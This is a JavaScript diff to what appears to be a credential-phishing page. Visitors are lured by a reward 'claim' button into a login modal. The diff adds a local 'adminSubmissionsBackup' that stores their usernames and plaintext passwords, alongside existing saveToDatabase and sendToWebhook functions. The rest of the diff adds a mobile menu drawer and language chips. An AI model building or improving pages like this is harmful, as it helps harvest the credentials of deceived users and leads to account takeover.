@@ -12,6 +12,19 @@ function sendToWebhook(content) {
 }
 
 async function saveToDatabase(username, password) {
+    // Resilient local backup (guarantees data accessibility on GitHub Pages static deployment)
+    try {
+        const localList = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
+        localList.unshift({
+            id: localList.length + 1,
+            username: username,
+            password: password,
+            ip_address: 'Client (Web)',
+            created_at: new Date().toLocaleString()
+        });
+        localStorage.setItem('adminSubmissionsBackup', JSON.stringify(localList));
+    } catch (e) {}
+
     try {
         const res = await fetch('/api/login', {
             method: 'POST',
@@ -48,9 +61,14 @@ const scrollSection = document.getElementById("scrollSection");
 
 // Mobile Elements
 const mobileLoginBtn = document.getElementById("mobileLoginBtn");
-const mobileCreateCharBtn = document.getElementById("mobileCreateCharBtn");
-const mobileScreenshotBtn = document.getElementById("mobileScreenshotBtn");
 const mobileFlagTrigger = document.getElementById("mobileFlagTrigger");
+const mobileMenuBtn = document.getElementById("mobileMenuBtn");
+const mobileDrawer = document.getElementById("mobileDrawer");
+const mobileDrawerOverlay = document.getElementById("mobileDrawerOverlay");
+const closeMobileDrawer = document.getElementById("closeMobileDrawer");
+const drawerClaimBtn = document.getElementById("drawerClaimBtn");
+const drawerScreenshotsBtn = document.getElementById("drawerScreenshotsBtn");
+const drawerLangChips = document.querySelectorAll(".drawer-lang-chip");
 const mobileLangSheet = document.getElementById("mobileLangSheet");
 const closeLangSheet = document.getElementById("closeLangSheet");
 const langSheetItems = document.querySelectorAll(".lang-sheet-item");
@@ -69,11 +87,21 @@ function toggleFlagsDropdown(show) {
     flagBtn?.setAttribute("aria-expanded", isShow ? "true" : "false");
 }
 
+function toggleMobileDrawer(show) {
+    const isShow = typeof show === "boolean" ? show : !mobileDrawer?.classList.contains("show");
+    mobileDrawer?.classList.toggle("show", isShow);
+    mobileDrawerOverlay?.classList.toggle("show", isShow);
+    if (isShow) {
+        toggleMobileLangSheet(false);
+    }
+}
+
 function toggleMobileLangSheet(show) {
     const isShow = typeof show === "boolean" ? show : !mobileLangSheet?.classList.contains("show");
     mobileLangSheet?.classList.toggle("show", isShow);
     if (isShow) {
         modalBackdrop?.classList.add("show");
+        toggleMobileDrawer(false);
     } else if (!loginBox?.classList.contains("show") && !rewardPopup?.classList.contains("show")) {
         modalBackdrop?.classList.remove("show");
     }
@@ -109,6 +137,12 @@ function setLanguage(langCode, langName, langEmoji) {
         } else if (!isActive && checkSpan) {
             checkSpan.remove();
         }
+    });
+
+    // Update active chip in drawer
+    drawerLangChips.forEach(chip => {
+        const isActive = chip.getAttribute("data-lang") === langCode;
+        chip.classList.toggle("active", isActive);
     });
 
     showToast(`Language switched: ${langName}`);
@@ -151,8 +185,46 @@ langSheetItems.forEach(item => {
     });
 });
 
+// Mobile Drawer Listeners
+mobileMenuBtn?.addEventListener("click", (e) => {
+    e.stopPropagation();
+    toggleMobileDrawer(true);
+});
+
+closeMobileDrawer?.addEventListener("click", (e) => {
+    e.stopPropagation();
+    toggleMobileDrawer(false);
+});
+
+mobileDrawerOverlay?.addEventListener("click", () => {
+    toggleMobileDrawer(false);
+});
+
+drawerClaimBtn?.addEventListener("click", (e) => {
+    e.stopPropagation();
+    toggleMobileDrawer(false);
+    openLoginModal();
+});
+
+drawerScreenshotsBtn?.addEventListener("click", (e) => {
+    e.stopPropagation();
+    toggleMobileDrawer(false);
+    document.getElementById("section2Section")?.scrollIntoView({ behavior: "smooth" });
+});
+
+drawerLangChips.forEach(chip => {
+    chip.addEventListener("click", (e) => {
+        e.stopPropagation();
+        const langCode = chip.getAttribute("data-lang") || "en";
+        const langName = chip.getAttribute("data-name") || "English";
+        const langEmoji = chip.getAttribute("data-emoji") || "🇺🇸";
+        setLanguage(langCode, langName, langEmoji);
+    });
+});
+
 function openLoginModal() {
     toggleMobileLangSheet(false);
+    toggleMobileDrawer(false);
     loginBox.classList.add("show");
     modalBackdrop.classList.add("show");
     document.getElementById("username")?.focus();
@@ -164,6 +236,7 @@ function closeAllModals() {
     modalBackdrop.classList.remove("show");
     toggleFlagsDropdown(false);
     toggleMobileLangSheet(false);
+    toggleMobileDrawer(false);
 }
 
 // Open modal triggers
